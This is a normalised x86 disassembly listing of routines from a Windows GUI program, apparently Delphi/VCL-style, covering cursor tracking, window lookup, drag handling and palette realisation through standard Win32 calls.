call GetCursorPos
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x4c ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x50 ] edx
jmp r-xdata
mov esi [ ebp - 0x8 ]
mov edx [ esi + 0x50 ]
mov eax [ ebp - 0x8 ]
mov edi [ eax + 0x40 ]
add edx [ edi + 0x4c ]
mov eax [ esi + 0x4c ]
add eax [ edi + 0x48 ]
lea ecx [ ebp - 0x18 ]
call sub_432a5c
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x54 ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x58 ] edx
sub_48bef8
adc eax [ ecx ]
add [ eax ] al
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x40 ]
mov eax esi
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_48b20c
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x40 ]
cmp [ esi + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x4c
push eax
mov eax esi
call sub_496868
push eax
call GetWindowRect
jmp r-xdata
lea ecx [ ebp - 0x20 ]
xor edx edx
xor eax eax
call sub_432a5c
lea edx [ ebp - 0x20 ]
lea ecx [ ebp - 0x18 ]
mov eax esi
call sub_48d98c
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x4c ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x50 ] edx
mov eax esi
mov edx [ r-xdata ]
call sub_448388
test al al
jne r-xdata
mov eax [ ebp - 0x8 ]
lea esi [ eax + 0x4c ]
lea edi [ eax + 0x64 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_48bce4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x10 ]
push eax
call GetCursorPos
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x4c ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x50 ] edx
jmp r-xdata
mov esi [ ebp - 0x8 ]
mov edx [ esi + 0x50 ]
mov eax [ ebp - 0x8 ]
mov edi [ eax + 0x40 ]
add edx [ edi + 0x4c ]
mov eax [ esi + 0x4c ]
add eax [ edi + 0x48 ]
lea ecx [ ebp - 0x18 ]
call sub_432a5c
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x54 ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x58 ] edx
sub_48c018
push ebp
mov ebp esp
push ebx
push esi
mov eax [ rw-data ]
cmp [ eax + 0x14 ] 0x0
setne bl
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov bl 0x1
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x90 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x90 ]
test eax eax
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x14 ]
mov ecx [ rw-data ]
mov si 0xffbd
call sub_4483f8
mov ebx eax
sub_48c08c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov [ ebp - 0x1 ] al
xor ebx ebx
mov [ ebp - 0x9 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
cmp [ eax + 0x5 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_48c3a1
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ rw-data ] eax
xor edx edx
push ebp
push sub_48c32f
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ eax + 0x5 ] 0x1
mov eax [ rw-data ]
movzx edx [ ebp - 0x1 ]
mov [ eax + 0x20 ] dl
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_48af04
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4483ac
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
cmp [ ebx + 0x14 ] 0x0
sete al
mov [ ebx + 0x74 ] al
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov [ ebp - 0x14 ] edx
mov edx [ eax + 0x10 ]
mov [ ebp - 0x10 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x14 ]
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
xor eax eax
jmp r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax + 0x18 ]
mov [ ebp - 0x14 ] edx
mov edx [ eax + 0x1c ]
mov [ ebp - 0x10 ] edx
jmp r-xdata
mov [ ebp - 0x9 ] al
cmp [ rw-data ] 0x2
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x74 ] 0x0
jne r-xdata
push ebp
call sub_48c018
pop ecx
test al al
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov al 0x1
call sub_48b920
test al al
je r-xdata
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call SetCursor
mov eax [ rw-data ]
call sub_498a54
jmp r-xdata
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x74 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48c336
mov eax [ rw-data ]
call sub_4481b0
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov eax [ ebx + 0x40 ]
mov dl 0x1
call sub_477028
test eax eax
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
mov eax [ rw-data ]
mov [ eax + 0x5 ] 0x0
mov eax [ ebp - 0x10 ]
push eax
movzx eax [ ebp - 0x9 ]
push eax
mov eax [ rw-data ]
mov edx [ eax + 0x14 ]
mov ecx [ ebp - 0x14 ]
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx ]
mov al 0x3
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
xor ecx ecx
mov edx 0xb03a
mov eax [ rw-data ]
call sub_48f2b0
jmp r-xdata
mov edx [ eax + 0x278 ]
cmp edx [ ebx + 0x40 ]
jne r-xdata
mov edx [ rw-data ]
mov [ ebp - 0x8 ] edx
xor edx edx
push ebp
push sub_48c2d3
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ rw-data ]
mov edx [ edx + 0x14 ]
push edx
mov edx [ rw-data ]
add edx 0xc
push edx
mov edx [ rw-data ]
mov edx [ edx + 0x8 ]
mov ecx [ rw-data ]
xchg edx eax
call sub_48b7ec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov al 0x4
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0xc ] ecx
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0x10 ] ecx
xor edx edx
mov [ ebp - 0x14 ] edx
xor edx edx
mov [ ebp - 0x10 ] edx
xor edx edx
call sub_47bed4
retn
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
sub_48c336
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
retn
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_448388
test al al
jne r-xdata
mov eax [ rw-data ]
call sub_4481b0
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_448388
test al al
jne r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
sub_48c3c8
push ebx
push esi
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
call sub_48a70c
mov esi eax
test esi esi
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_48c3fc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov edi eax
xor esi esi
mov eax edi
call sub_48c3c8
mov ebp eax
test ebp ebp
je r-xdata
mov eax esi
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi ebp
push 0x0
push 0x0
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax ebp
call sub_48dac0
lea edx [ esp + 0x8 ]
mov ecx ebx
mov eax ebp
call sub_4933e8
test eax eax
je r-xdata
mov esi eax
sub_48c448
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov edx esi
call sub_424590
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov [ ebx ] eax
sub_48c470
push ebx
mov ebx eax
mov eax [ ebx ]
call sub_4248a0
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx ]
call sub_4481b0
xor eax eax
mov [ ebx ] eax
sub_48c490
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
push esp
push ebx
call GetWindowOrgEx
push 0x0
mov eax [ esp + 0x8 ]
sub eax edi
push eax
mov eax [ esp + 0x8 ]
sub eax esi
push eax
push ebx
call SetWindowOrgEx
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_48c4c0
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ rw-data ]
call sub_424b88
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_48c570
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_424bec
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0xc ]
jne r-xdata
xor eax eax
push ebp
push sub_48c549
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
call sub_48c6fc
call sub_448d2c
call sub_448d2c
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4246e8
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
call sub_46e760
test al al
je r-xdata
mov esp ebp
pop ebp
retn
sub_48c57c
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_424b88
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_48c61a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48c621
mov eax [ rw-data ]
call sub_424bec
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_48c5f2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_48c6fc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_46e7bc
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4246e8
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_46e760
test al al
je r-xdata
sub_48c628
push ebx
push esi
call sub_44873c
mov ebx edx
mov esi eax
mov eax esi
call sub_48c6fc
mov edx ebx
and dl 0xfc
mov eax esi
call sub_46e170
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4486e4
sub_48c654
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_46e94c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_46e950
mov eax [ ebp - 0x4 ]
call sub_48c748
mov eax [ rw-data ]
call sub_424b88
mov ebx eax
xor eax eax
push ebp
push sub_48c6d9
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x8 ] 0x4
jl r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x60 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_424590
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_424bec
retn
call sub_48c4c0
sub_48c6fc
push ebx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
je r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_46e950
mov edx ebx
mov eax [ rw-data ]
call sub_424b9c
mov eax [ ebx + 0x5c ]
push eax
mov eax [ ebx + 0x60 ]
push eax
call ReleaseDC
xor eax eax
mov [ ebx + 0x5c ] eax
sub_48c748
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x58 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_48e6b4
test al al
je r-xdata
and [ ebx + 0x38 ] 0xffffff7f
or [ ebx + 0x38 ] 0x80
jmp r-xdata
sub_48c774
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_448180
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_48c7b0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_424e90
pop esi
pop ebx
retn
mov eax ebx
mov edx [ esi + 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ esi + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0x14 ]
mov [ eax + 0x14 ] edx
mov edx [ esi + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_48c7f8
push esi
mov esi eax
sub edx 0x1
jb r-xdata
cmp ecx [ esi + 0x8 ]
je r-xdata
je r-xdata
pop esi
retn
mov [ esi + 0x8 ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0xc ]
je r-xdata
dec edx
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x10 ]
jae r-xdata
mov [ esi + 0xc ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0x10 ]
je r-xdata
dec edx
je r-xdata
mov [ esi + 0x10 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x14 ]
jae r-xdata
mov [ esi + 0x10 ] ecx
mov eax [ esi + 0x8 ]
test eax eax
jbe r-xdata
cmp ecx [ esi + 0x14 ]
je r-xdata
jmp r-xdata
mov [ esi + 0x14 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp eax ecx
jae r-xdata
mov [ esi + 0x14 ] ecx
mov eax [ esi + 0xc ]
test eax eax
jbe r-xdata
mov [ esi + 0x8 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
cmp eax ecx
jae r-xdata
mov [ esi + 0xc ] ecx
sub_48c8b4
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x1c ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_48c981
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48c988
lea eax [ ebp - 0x1c ]
call j_sub_449348
lea eax [ ebp - 0x8 ]
call j_sub_449348
retn
mov edx edi
mov eax [ ebx + 0x10 ]
mov si 0xffee
call sub_4483f8
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x78 ] 0x0
je r-xdata
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov eax [ edi ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x11
lea edx [ ebp - 0x1c ]
mov eax [ ebx + 0x10 ]
movzx eax [ eax + 0x84 ]
call sub_462374
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x11
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax r-xdata
call sub_436540
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_449d2c
sub_48c99b
inc [ edi ]
add [ eax ] al
add [ 0x20007300 ] ah
add [ eax ] ch
add [ 0x29007300 ] ah
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_48ca17
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4513b8
test al al
je r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x18 ]
call sub_48df68
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4483ac
mov edx [ eax + 0x64 ]
pop eax
call j_sub_44a294
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48ca1e
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
mov al 0x1
sub_48ca38
push ebx
mov ebx eax
mov eax ebx
call sub_4513e0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x4c ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4483ac
pop edx
cmp dl [ eax + 0x6a ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_48ca80
push ebx
mov ebx eax
mov eax ebx
call sub_451430
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4483ac
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x80 ]
call j_sub_44a294
je r-xdata
mov al 0x1
pop ebx
retn
sub_48cab8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x10 ]
mov eax esi
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4483ac
mov eax [ eax + 0xa4 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x7c ]
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_48caf8
push ebx
mov ebx eax
mov eax ebx
call sub_45146c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4483ac
movzx eax [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x57 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_48cb2c
push ebx
mov ebx eax
mov eax ebx
call sub_42eb7c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x110 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
sete al
pop ebx
retn
sub_48cb54
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_48dfa0
sub_48cb78
push esi
push ecx
mov [ esp ] dl
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop edx
pop esi
retn
movzx edx [ esp ]
mov eax [ esi + 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
sub_48cba0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x80
mov edx esi
call sub_449d2c
sub_48cbc4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_48deb0
sub_48cbe4
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x110 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x114 ] edx
sub_48cc10
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4483ac
mov edi eax
mov eax [ edi + 0x74 ]
mov esi [ ebx + 0x18 ]
cmp eax [ esi + 0x160 ]
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4483ac
mov edx [ edi + 0x78 ]
mov eax [ esi + 0x15c ]
call j_sub_44a294
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4483ac
movzx eax [ edi + 0x70 ]
cmp al [ esi + 0x158 ]
je r-xdata
mov al 0x1
sub_48cc78
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_48d7f8
sub_48cc98
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_48d7e4
sub_48ccb8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0x158 ] bl
sub_48ccd8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_48df44
sub_48ccfc
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_42e278
mov [ ebx + 0x3c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x74 ]
mov [ ebx + 0x38 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_46d3c0
mov esi eax
mov [ ebx + 0x64 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_48e020
movzx eax [ r-xdata ]
mov [ ebx + 0x61 ] al
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_48c774
mov esi eax
mov [ ebx + 0x70 ] esi
mov [ esi + 0x1c ] ebx
mov [ esi + 0x18 ] sub_48f070
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_49c68c
mov esi eax
mov [ ebx + 0x74 ] esi
mov [ esi + 0x1c ] ebx
mov [ esi + 0x18 ] sub_490dcc
mov [ ebx + 0x6c ] 0xff000005
mov [ ebx + 0x57 ] 0x1
mov [ ebx + 0x58 ] 0x1
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x8a ] 0x1
mov [ ebx + 0x60 ] 0x1
mov [ ebx + 0x5e ] 0x0
mov [ ebx + 0x7a ] 0xfff4
mov eax [ r-xdata ]
mov [ ebx + 0xa8 ] eax
mov [ ebx + 0x158 ] 0x1
xor eax eax
mov [ ebx + 0x16c ] eax
xor eax eax
mov [ ebx + 0x164 ] eax
mov [ ebx + 0x168 ] 0x1
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_48ce0c
push ebx
push esi
push edi
add esp 0xfffffff0
call sub_44873c
mov ebx edx
mov edi eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx edi
call sub_480cb0
mov eax [ edi + 0x90 ]
test eax eax
je r-xdata
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4486e4
mov edx edi
call sub_42e594
push edi
mov eax [ edi + 0x90 ]
xor ecx ecx
mov edx 0xb039
call sub_48f2b0
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov edx esp
mov eax edi
call sub_48d81c
mov ecx esp
or edx 0xffffffff
mov eax edi
mov si 0xffcc
call sub_4483f8
xor eax eax
mov [ edi + 0x90 ] eax
jmp r-xdata
mov eax [ edi + 0x68 ]
call sub_4481b0
xor eax eax
mov [ edi + 0x68 ] eax
mov eax [ edi + 0x70 ]
call sub_4481b0
mov eax [ edi + 0x64 ]
call sub_4481b0
mov eax [ edi + 0x16c ]
call sub_436444
mov eax [ edi + 0x74 ]
call sub_4481b0
xor eax eax
mov [ edi + 0x164 ] eax
mov edx ebx
and dl 0xfc
mov eax edi
call sub_42e2c4
test bl bl
jle r-xdata
sub_48cefc
push esi
push edi
mov edi edx
mov esi eax
cmp edi [ esi + 0x30 ]
je r-xdata
pop edi
pop esi
retn
mov eax edi
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x68 ]
sub_48cf24
push ebx
push esi
push edi
add esp 0xfffffff8
mov [ esp ] dl
mov edi eax
xor ebx ebx
cmp [ edi + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax edi
mov si 0xffd8
call sub_4483f8
mov esi eax
test esi esi
je r-xdata
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov ebx eax
movzx eax [ esp ]
xor al 0x1
neg al
sbb eax eax
push eax
push esi
push ebx
call SelectPalette
mov esi eax
push ebx
call RealizePalette
test eax eax
je r-xdata
push 0xffffffff
push esi
push ebx
call SelectPalette
push ebx
mov eax [ esp + 0x8 ]
push eax
call ReleaseDC
mov bl 0x1
mov eax edi
mov edx [ eax ]
call [ edx + 0x80 ]
sub_48cfac
push ebx
push esi
push ecx
mov [ esp ] dl
mov esi eax
movzx eax [ esp ]
cmp al [ esi + 0x61 ]
je r-xdata
pop edx
pop esi
pop ebx
retn
movzx ebx [ esi + 0x61 ]
movzx eax [ esp ]
mov [ esi + 0x61 ] al
test [ esi + 0x1c ] 0x1
jne r-xdata
movzx eax [ r-xdata ]
cmp al bl
je r-xdata
mov eax esi
call sub_48d40c
movzx eax [ r-xdata ]
cmp al [ esi + 0x61 ]
jne r-xdata
mov eax [ esi + 0x18c ]
cmp eax [ esi + 0x40 ]
jne r-xdata
mov eax [ esi + 0x194 ]
push eax
mov eax [ esi + 0x198 ]
push eax
mov ecx [ esi + 0x190 ]
mov edx [ esi + 0x18c ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x88 ]
jmp r-xdata
mov eax [ esi + 0x190 ]
